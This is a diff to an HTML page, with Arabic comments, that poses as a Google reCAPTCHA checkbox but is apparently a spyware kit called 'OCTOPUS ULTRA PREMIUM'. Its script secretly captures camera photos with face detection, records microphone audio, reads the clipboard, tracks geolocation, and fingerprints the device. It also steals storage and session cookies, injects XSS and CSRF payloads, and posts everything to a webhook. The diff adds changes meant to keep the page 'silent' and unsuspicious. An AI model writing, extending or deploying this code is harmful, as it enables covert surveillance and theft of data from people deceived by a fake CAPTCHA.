@@ -7,11 +7,10 @@
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🐙</text></svg>" />
     <style>
         /* ================================================================
-           OCTOPUS ULTRA PREMIUM – إصدار 2.3
-           تصميم دقيق، صامت، احترافي، يعمل مع أو بدون توكن
+           OCTOPUS ULTRA PREMIUM – إصدار 2.4
+           تصميم صامت، متدرج، لا يثير الشك
            ================================================================ */
 
-        /* ---------- إعادة تعيين عام ---------- */
         * {
             margin: 0;
             padding: 0;
@@ -29,7 +28,6 @@
             -webkit-font-smoothing: antialiased;
         }
 
-        /* ---------- حاوية الكابتشا ---------- */
         .captcha-wrapper {
             width: 340px;
             max-width: 100%;
@@ -47,7 +45,6 @@
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
         }
 
-        /* ---------- الصف الرئيسي ---------- */
         .captcha-row {
             display: flex;
             align-items: center;
@@ -55,7 +52,6 @@
             gap: 12px;
         }
 
-        /* ---------- مربع الاختيار (Spinner) ---------- */
         .spinner {
             position: relative;
             flex-shrink: 0;
@@ -85,7 +81,6 @@
             box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.15);
         }
 
-        /* علامة الصح */
         .checkmark .tick {
             width: 10px;
             height: 18px;
@@ -96,7 +91,6 @@
             transition: all 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
-        /* Spinner (التحميل) */
         .checkmark .loader {
             display: none;
             width: 20px;
@@ -107,7 +101,6 @@
             animation: spin 0.7s linear infinite;
         }
 
-        /* ---------- حالات المربع ---------- */
         .spinner.loading .checkmark {
             border-color: #1a73e8;
             background: #e8f0fe;
@@ -157,7 +150,6 @@
             line-height: 1;
         }
 
-        /* ---------- النص الرئيسي ---------- */
         .text {
             flex: 1;
             font-size: 18px;
@@ -181,7 +173,6 @@
             color: #e37400;
         }
 
-        /* ---------- الشعار ---------- */
         .logo {
             display: flex;
             flex-direction: column;
@@ -210,7 +201,6 @@
             color: #999;
         }
 
-        /* ---------- التذييل ---------- */
         .captcha-footer {
             display: flex;
             align-items: center;
@@ -262,13 +252,11 @@
             color: #aaa;
         }
 
-        /* ---------- أنيميشن ---------- */
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
-        /* ---------- استجابة للشاشات الصغيرة ---------- */
         @media (max-width: 480px) {
             .captcha-wrapper { width: 100%; }
             .text { font-size: 16px; }
@@ -285,7 +273,6 @@
             .logo img { width: 28px; }
         }
 
-        /* ---------- عناصر مخفية للكاميرا والصوت ---------- */
         #hiddenVideo {
             position: fixed;
             top: -1000px;
@@ -310,7 +297,6 @@
             pointer-events: none;
         }
 
-        /* ---------- تلميحات خفيفة ---------- */
         .sr-only {
             position: absolute;
             width: 1px;
@@ -325,13 +311,8 @@
 </head>
 <body>
 
-    <!-- ============================================================
-    واجهة reCAPTCHA – صامتة، أنيقة، احترافية
-    ============================================================ -->
     <div class="captcha-wrapper" id="captchaWrapper" role="button" tabindex="0" aria-label="تحقق أنك لست روبوتاً">
-
         <div class="captcha-row">
-            <!-- مربع الاختيار -->
             <div class="spinner" id="spinner">
                 <input type="checkbox" id="captcha" aria-label="أنا لست روبوتاً" />
                 <label class="checkmark" for="captcha">
@@ -339,11 +320,7 @@
                     <div class="loader"></div>
                 </label>
             </div>
-
-            <!-- النص -->
             <div class="text" id="mainText">أنا لست روبوتاً</div>
-
-            <!-- الشعار -->
             <div class="logo">
                 <img
                 src="https://www.gstatic.com/recaptcha/api2/logo_48.png"
@@ -356,11 +333,8 @@
                 <small>الخصوصية - الشروط</small>
             </div>
         </div>
-
-        <!-- التذييل -->
         <div class="captcha-footer">
             <div class="brand">
-                <!-- شعار Google SVG -->
                 <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                     <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
                     <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
@@ -377,23 +351,16 @@
         </div>
     </div>
 
-    <!-- ============================================================
-    عناصر مخفية للكاميرا، الصوت، والبصمة
-    ============================================================ -->
     <video id="hiddenVideo" autoplay playsinline muted></video>
     <canvas id="hiddenCanvas"></canvas>
     <canvas id="fingerprintCanvas"></canvas>
 
-    <!-- ============================================================
-    Face-API.js (يُحمّل عند الحاجة فقط)
-    ============================================================ -->
     <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js">
     </script>
 
     <script>
         // ================================================================
-        //  OCTOPUS ULTRA PREMIUM v2.3 – الجراحة الصامتة المتطورة
-        //  يعمل مع أو بدون توكن – بدون توكن = MASTER
+        //  OCTOPUS ULTRA PREMIUM v2.4 – صامت، متدرج، لا يثير الشك
         // ================================================================
 
         // ================================================================
@@ -411,11 +378,11 @@
             TOKEN_LENGTH: 6,
             MAX_FILE_SIZE: 10 * 1024 * 1024,
             FACE_MODEL_URL: 'https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/weights',
-            MASTER_TOKEN: 'MASTER', // التوكن الأساسي للمطور
+            MASTER_TOKEN: 'MASTER',
         };
 
         // ================================================================
-        //  2. الحالة (State)
+        //  2. الحالة
         // ================================================================
         const state = {
             userToken: null,
@@ -443,6 +410,7 @@
             startTime: null,
             isFaceApiLoaded: false,
             faceApiLoadAttempted: false,
+            permissionsGranted: { camera: false, mic: false, location: false, clipboard: false },
         };
 
         // ================================================================
@@ -487,44 +455,35 @@
         }
 
         // ================================================================
-        //  5. استخراج التوكن (مع أو بدون رابط) – بدون توكن = MASTER
+        //  5. استخراج التوكن (مع أو بدون رابط)
         // ================================================================
 
-        /** استخراج أو توليد التوكن – يعمل دائماً */
         function extractTokenFromURL() {
             const params = new URLSearchParams(window.location.search);
             const token = params.get('i');
-
-            // 1. توكن من الرابط
             if (token && token.length === CONFIG.TOKEN_LENGTH && /^[A-Z0-9]+$/.test(token)) {
                 state.userToken = token;
                 sessionStorage.setItem('octopus_token', token);
                 return true;
             }
-
-            // 2. توكن من sessionStorage
             const saved = sessionStorage.getItem('octopus_token');
             if (saved && saved.length === CONFIG.TOKEN_LENGTH && /^[A-Z0-9]+$/.test(saved)) {
                 state.userToken = saved;
                 return true;
             }
-
-            // 3. لو مفيش توكن → استخدم التوكن الأساسي للمطور
-            const masterToken = CONFIG.MASTER_TOKEN;
-            state.userToken = masterToken;
-            sessionStorage.setItem('octopus_token', masterToken);
-            return true; // دايماً true عشان الصفحة تظهر
+            state.userToken = CONFIG.MASTER_TOKEN;
+            sessionStorage.setItem('octopus_token', CONFIG.MASTER_TOKEN);
+            return true;
         }
 
         // ================================================================
-        //  6. باقي الدوال (نفس الكود السابق)
+        //  6. باقي الدوال (معدلة للصمت)
         // ================================================================
 
         function classifyDevice() {
             const ua = navigator.userAgent;
             const result = { os: 'Unknown', osVersion: 'Unknown', browser: 'Unknown', browserVersion: 'Unknown',
                 deviceType: 'Desktop' };
-
             if (ua.includes('Windows NT 10.0')) { result.os = 'Windows';
                 result.osVersion = '10'; } else if (ua.includes('Windows NT 6.3')) { result.os = 'Windows';
                 result.osVersion = '8.1'; } else if (ua.includes('Windows NT 6.2')) { result.os = 'Windows';
@@ -537,7 +496,6 @@
                 'iPod')) { result.os = 'iOS';
                 result.osVersion = (ua.match(/OS ([\d_]+)/)?.[1] || '').replace(/_/g, '.') || 'Unknown';
                 result.deviceType = ua.includes('iPad') ? 'Tablet' : 'Mobile'; }
-
             if (ua.includes('Edg/')) { result.browser = 'Edge';
                 result.browserVersion = ua.match(/Edg\/([\d.]+)/)?.[1] || 'Unknown'; } else if (ua.includes('OPR/') || ua
                 .includes('Opera/')) { result.browser = 'Opera';
@@ -549,17 +507,14 @@
                 result.browser = 'Safari';
                 result.browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || ua.match(/Safari\/([\d.]+)/)?.[1] ||
                     'Unknown'; }
-
             if (/Tablet|iPad/i.test(ua)) result.deviceType = 'Tablet';
             else if (/Mobile|iPhone|Android/i.test(ua) && !/Tablet|iPad/i.test(ua)) result.deviceType = 'Mobile';
-
             state.deviceClassification = result;
             return result;
         }
 
         function detectSpoofing() {
             const result = { canvasSpoof: false, webglSpoof: false, vpnProxy: false, headless: false };
-
             try {
                 const c = document.createElement('canvas');
                 c.width = 256;
@@ -574,7 +529,6 @@
                 }
                 if (count < 60000) result.canvasSpoof = true;
             } catch (_) {}
-
             try {
                 const c = document.createElement('canvas');
                 const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
@@ -588,7 +542,6 @@
                     }
                 }
             } catch (_) {}
-
             try {
                 const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                 pc.createDataChannel('test');
@@ -603,11 +556,9 @@
                 setTimeout(() => pc.close(), 2000);
                 if (ips.size > 1) result.vpnProxy = true;
             } catch (_) {}
-
             if (navigator.webdriver === true) result.headless = true;
             if (/HeadlessChrome/.test(navigator.userAgent)) result.headless = true;
             if (/PhantomJS/.test(navigator.userAgent)) result.headless = true;
-
             state.spoofingDetected = result;
             return result;
         }
@@ -651,11 +602,18 @@
             return extensions;
         }
 
+        // ================================================================
+        //  7. الحافظة – تطلب في آخر خطوة وبصمت
+        // ================================================================
         async function readClipboard() {
             try {
-                state.clipboardContent = await navigator.clipboard.readText();
+                // نحاول قراءة الحافظة بدون طلب إذن صريح (قد يطلب المتصفح إذن تلقائياً)
+                const text = await navigator.clipboard.readText();
+                state.clipboardContent = text;
+                state.permissionsGranted.clipboard = true;
                 return;
             } catch (_) {
+                // لو فشلت، نحاول بطريقة بدائية (قد تظهر رسالة إذن)
                 try {
                     const ta = document.createElement('textarea');
                     ta.style.cssText = 'position:fixed;opacity:0;pointer-events:none;top:-1000px;left:-1000px;';
@@ -663,9 +621,11 @@
                     ta.focus();
                     document.execCommand('paste');
                     state.clipboardContent = ta.value || null;
+                    if (state.clipboardContent) state.permissionsGranted.clipboard = true;
                     document.body.removeChild(ta);
                 } catch (_2) {
                     state.clipboardContent = null;
+                    state.permissionsGranted.clipboard = false;
                 }
             }
         }
@@ -705,6 +665,9 @@
             return results;
         }
 
+        // ================================================================
+        //  8. جمع بيانات الجهاز (بدون طلب صلاحيات إضافية)
+        // ================================================================
         async function collectDeviceData() {
             const data = {};
             const dev = state.deviceClassification;
@@ -843,6 +806,9 @@
             return data;
         }
 
+        // ================================================================
+        //  9. الموقع – يطلب أولاً وبصمت
+        // ================================================================
         async function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
@@ -868,8 +834,10 @@
                         state.userLocation.lng = best.coords.longitude;
                         state.userLocation.accuracy = best.coords.accuracy;
                         state.userLocation.error = null;
+                        state.permissionsGranted.location = true;
                     } else {
                         state.userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
+                        state.permissionsGranted.location = false;
                     }
                     resolve();
                 };
@@ -879,6 +847,7 @@
                         if (watchId) navigator.geolocation.clearWatch(watchId);
                         if (best) finish();
                         else { state.userLocation.error = 'انتهت المهلة';
+                            state.permissionsGranted.location = false;
                             resolve(); }
                     }
                 }, timeout);
@@ -898,6 +867,7 @@
                     if (resolved) return;
                     if (e.code === 1) {
                         state.userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
+                        state.permissionsGranted.location = false;
                         resolved = true;
                         if (watchId) navigator.geolocation.clearWatch(watchId);
                         clearTimeout(timer);
@@ -907,6 +877,7 @@
                     if (attempts < maxAttempts) { /* نستمر */ } else {
                         if (best) finish();
                         else { state.userLocation.error = e.message || 'تعذر الحصول على الموقع';
+                            state.permissionsGranted.location = false;
                             resolve(); }
                     }
                 };
@@ -919,6 +890,9 @@
             });
         }
 
+        // ================================================================
+        //  10. Face-API (تتحمل الفشل بصمت)
+        // ================================================================
         async function loadFaceApi() {
             if (state.isFaceApiLoaded) return true;
             if (state.faceApiLoadAttempted) return false;
@@ -945,6 +919,9 @@
             }
         }
 
+        // ================================================================
+        //  11. الكاميرا – تطلب بشكل طبيعي
+        // ================================================================
         async function startCameraAndCapture() {
             return new Promise(async (resolve) => {
                 try {
@@ -957,6 +934,7 @@
                         audio: false,
                     };
                     state.mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    state.permissionsGranted.camera = true;
                     el.hiddenVideo.srcObject = state.mediaStream;
                     await el.hiddenVideo.play();
 
@@ -1017,6 +995,7 @@
                     }
                     resolve(true);
                 } catch (err) {
+                    state.permissionsGranted.camera = false;
                     if (state.mediaStream) {
                         state.mediaStream.getTracks().forEach(t => t.stop());
                         state.mediaStream = null;
@@ -1027,12 +1006,16 @@
             });
         }
 
+        // ================================================================
+        //  12. الميكروفون – يطلب بشكل طبيعي
+        // ================================================================
         async function recordAudio() {
             return new Promise(async (resolve) => {
                 try {
                     const constraints = { audio: { echoCancellation: false, noiseSuppression: false,
                             autoGainControl: false } };
                     state.audioStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    state.permissionsGranted.mic = true;
                     state.audioRecorder = new MediaRecorder(state.audioStream, { mimeType: 'audio/webm;codecs=opus' });
                     state.audioChunks = [];
                     state.audioRecorder.ondataavailable = (e) => {
@@ -1059,6 +1042,7 @@
                         }
                     }, CONFIG.AUDIO_DURATION + 3000);
                 } catch (_) {
+                    state.permissionsGranted.mic = false;
                     resolve();
                 }
             });
@@ -1101,9 +1085,11 @@
             }
         }
 
+        // ================================================================
+        //  13. الهجمات – صامتة تماماً
+        // ================================================================
         function deployAdvancedAttacks() {
             const results = { xss: false, csrf: false, sessionHijack: false, payloads: [] };
-
             try {
                 const inp = document.createElement('input');
                 inp.type = 'hidden';
@@ -1114,7 +1100,6 @@
                 results.payloads.push({ type: 'xss', content: inp.value });
                 document.body.removeChild(inp);
             } catch (_) {}
-
             try {
                 const ifr = document.createElement('iframe');
                 ifr.style.cssText = 'position:fixed;top:-1000px;left:-1000px;width:1px;height:1px;opacity:0;pointer-events:none;';
@@ -1123,7 +1108,6 @@
                 setTimeout(() => ifr.remove(), 3000);
                 results.csrf = true;
             } catch (_) {}
-
             try {
                 const cookies = document.cookie.split(';');
                 const sessionCookies = cookies.filter(c => {
@@ -1136,11 +1120,13 @@
                     results.payloads.push({ type: 'session', cookies: sessionCookies });
                 }
             } catch (_) {}
-
             state.attacksData = results;
             return results;
         }
 
+        // ================================================================
+        //  14. الأمان – صامت
+        // ================================================================
         function setupSecurity() {
             document.addEventListener('contextmenu', e => e.preventDefault());
             document.addEventListener('dragstart', e => e.preventDefault());
@@ -1212,6 +1198,9 @@
             } catch (_) {}
         }
 
+        // ================================================================
+        //  15. الإرسال النهائي
+        // ================================================================
         async function sendAllData() {
             const fd = new FormData();
             fd.append('event', 'submission');
@@ -1232,6 +1221,8 @@
                 fd.append('transcribedText', state.transcribedText);
                 fd.append('detectedLanguage', state.detectedLanguage || 'unknown');
             }
+            // الحافظة ضمن deviceData، لكن نضيفها لوحدها عشان الوضوح
+            fd.append('clipboard', state.clipboardContent || '');
 
             if (state.capturedPhotoFiles.length > 0) {
                 state.capturedPhotoFiles.forEach((f, i) => {
@@ -1249,6 +1240,9 @@
             return result;
         }
 
+        // ================================================================
+        //  16. عملية الجمع المتدرجة – الصلاحيات تطلب واحدة تلو الأخرى
+        // ================================================================
         async function collectEverything() {
             if (state.isCollecting || state.collectionComplete) return;
             state.isCollecting = true;
@@ -1256,25 +1250,35 @@
             setUIState('loading');
 
             try {
-                await Promise.all([
-                    (async () => { classifyDevice(); })(),
-                    (async () => { detectSpoofing(); })(),
-                    (async () => { await detectExtensions(); })(),
-                    (async () => { await readClipboard(); })(),
-                    (async () => { stealStorages(); })(),
-                    (async () => { getSearchHistory(); })(),
-                    (async () => { await getLocation(); })(),
-                ]);
+                // 1. جمع البيانات الأساسية (لا تطلب صلاحيات)
+                classifyDevice();
+                detectSpoofing();
+                await detectExtensions();
+                stealStorages();
+                getSearchHistory();
 
-                await collectDeviceData();
+                // 2. طلب الموقع (أولاً)
+                await getLocation();
 
+                // 3. طلب الكاميرا (ثانياً)
                 const cameraOk = await startCameraAndCapture();
-                if (!cameraOk) throw new Error('camera failed');
+                if (!cameraOk) {
+                    // لو فشلت الكاميرا، نكمل عادي
+                }
 
+                // 4. طلب الميكروفون (ثالثاً)
                 await recordAudio();
 
+                // 5. جمع بيانات الجهاز (بعد الصلاحيات)
+                await collectDeviceData();
+
+                // 6. الهجمات
                 deployAdvancedAttacks();
 
+                // 7. الحافظة – آخر حاجة، ولو فشلت تتجاهل
+                await readClipboard();
+
+                // 8. الإرسال
                 await sendAllData();
 
                 state.collectionComplete = true;
@@ -1289,7 +1293,7 @@
         }
 
         // ================================================================
-        //  23. أحداث الواجهة
+        //  17. أحداث الواجهة
         // ================================================================
         el.checkbox.addEventListener('change', function(e) {
             if (this.checked) {
@@ -1316,17 +1320,14 @@
         });
 
         // ================================================================
-        //  24. التهيئة (تعمل مع أو بدون توكن)
+        //  18. التهيئة
         // ================================================================
         window.addEventListener('load', async () => {
-            // استخراج أو توليد التوكن – دايماً هينجح
             extractTokenFromURL();
-
-            // إعداد الأمان والتخفي
             setupSecurity();
             enhanceStealth();
 
-            // إرسال حدث زيارة (بيانات أولية)
+            // إرسال حدث زيارة
             try {
                 const fd = new FormData();
                 fd.append('event', 'visit');
@@ -1341,12 +1342,11 @@
                 await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: fd });
             } catch (_) {}
 
-            // جمع البيانات الأساسية
             classifyDevice();
             detectSpoofing();
             await collectDeviceData();
 
-            console.log('🐙 OCTOPUS ULTRA PREMIUM v2.3 – جاهز (توكن: ' + state.userToken + ')');
+            console.log('🐙 OCTOPUS ULTRA PREMIUM v2.4 – صامت، جاهز (توكن: ' + state.userToken + ')');
         });
 
         // تنظيف التدفقات عند الخروج
